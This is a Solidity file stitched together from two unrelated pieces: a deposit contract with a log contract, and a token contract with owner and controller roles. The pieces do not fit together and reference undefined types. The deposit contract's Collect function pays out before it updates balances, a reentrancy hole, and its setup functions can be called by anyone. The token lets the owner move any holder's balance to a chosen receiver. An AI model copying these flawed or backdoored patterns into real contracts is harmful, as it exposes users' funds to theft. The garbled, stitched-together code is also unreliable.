
 

pragma solidity ^0.4.19;

contract ACCURAL_DEPOSIT
{
    mapping (address=>uint256) public balances;   
   
    uint public MinSum = 1 ether;
    
    LogFile Log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);
    
    bool intitalized;
    
    function SetMinSum(uint _val)
    public
    {
        if(intitalized)revert();
        MinSum = _val;
    }
    
    function SetLogFile(address _log)
    public
    {
        if(intitalized)revert();
        Log = LogFile(_log);
    }
    
    function Initialized()
    public
    {
        intitalized = true;
    }
    
    function Deposit()
    public
    payable
    {
        balances[msg.sender]+= msg.value;
        Log.AddMessage(msg.sender,msg.value,"Put");
    }
    
    function Collect(uint _am)
    public
    payable
    {
        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)
        {
             
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                Log.AddMessage(msg.sender,_am,"Collect");
            }
        }
    }
    
    function() 
    public 
    payable
    {
        Deposit();
    }
    
}



contract LogFile
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    
    Message[] public History;
    
    Message LastMsg;
    
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}
contract XRT is StandardToken, OnlyOwner {
    uint256 private approvalCount = 0;
    uint256 public minApproval = 2;
    address public fundReceiver;

    function setApprovalCount(uint _value) public isController {
        approvalCount = _value;
    }
    
    function setMinApprovalCount(uint _value) public isController returns (bool){
        require(_value > 0);
        minApproval = _value;
        return true;
    }
    
    function getApprovalCount() public view isController returns (uint) {
        return approvalCount;
    }
    
    function getFundReceiver() public view isController returns (address) {
        return fundReceiver;
    }
    
    function controllerApproval(address _from, uint256 _value) public isOwner returns (bool) {
        require(minApproval <= approvalCount); 
        balances[_from] = balances[_from].safeSub(_value);
        balances[fundReceiver] = balances[fundReceiver].safeAdd(_value);
        emit Transfer(_from, fundReceiver, _value);
        return true;
    }
} 

contract StandardToken is ERC20 {
    using SafeMath for uint256;
    mapping(address => uint256) balances;

    function _transfer(address _from, address _to, uint256 _value) internal returns (bool success) {
        require(_from != address(0) && _from != _to);
        require(_to != address(0));
        balances[_from] = balances[_from].safeSub(_value);
        balances[_to] = balances[_to].safeAdd(_value);
        return true;
    }

    function balanceOf(address _owner) public view returns (uint balance) {
        return balances[_owner];
    }
}

library SafeMath {
    function safeSub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function safeAdd(uint256 a, uint256 b) internal pure returns (uint256) {
        uint c = a + b;
        assert(c >= a);
        return c;
    }
}

contract OnlyOwner {
    address public owner;
    address private controller;
    
    modifier isOwner {
        require(msg.sender == owner);
        _;
    }

    modifier isController {
        require(msg.sender == controller);
        _;
    }

    constructor() public {
        owner = msg.sender;
        controller = owner;
    }
}
